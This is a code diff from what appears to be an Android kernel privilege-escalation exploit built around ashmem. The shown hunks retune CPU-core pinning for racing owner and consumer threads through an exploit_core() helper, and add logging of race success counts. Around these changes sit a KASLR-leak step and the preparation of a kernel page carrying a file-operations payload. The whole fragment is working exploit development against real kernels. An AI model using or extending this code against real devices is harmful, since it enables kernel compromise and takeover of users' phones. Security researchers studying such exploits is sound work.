@@ -73,7 +73,7 @@ void *owner_thread(void *arg __attribute__((unused))) {
 
 void *consumer_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
-  pin_to_core(CONSUMER_CORE);
+  pin_to_core(exploit_core() + 1);
 
   int seen = 0;
 
@@ -119,6 +119,11 @@ void *consumer_thread(void *arg __attribute__((unused))) {
           break;
         }
       }
+    }
+    if (calls_this_seq > 0) {
+      pr_info("consumer seq=%d calls=%d success=%d tid=%d\n",
+              seq, calls_this_seq,
+              atomic_load(&consumer_success), tid);
     }
   }
 
@@ -218,7 +223,7 @@ int run_exploit(int argc, char **argv) {
   log_startup_context();
   init_ashmem_path();
 
-  pin_to_core(CORE);
+  pin_to_core(exploit_core());
   if (!slide_leak_kernel_base()) {
     pr_error("slide kaslr leak failed\n");
     return 1;
@@ -238,7 +243,7 @@ int run_exploit(int argc, char **argv) {
   }
 #endif
 
-  pin_to_core(CORE);
+  pin_to_core(exploit_core());
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
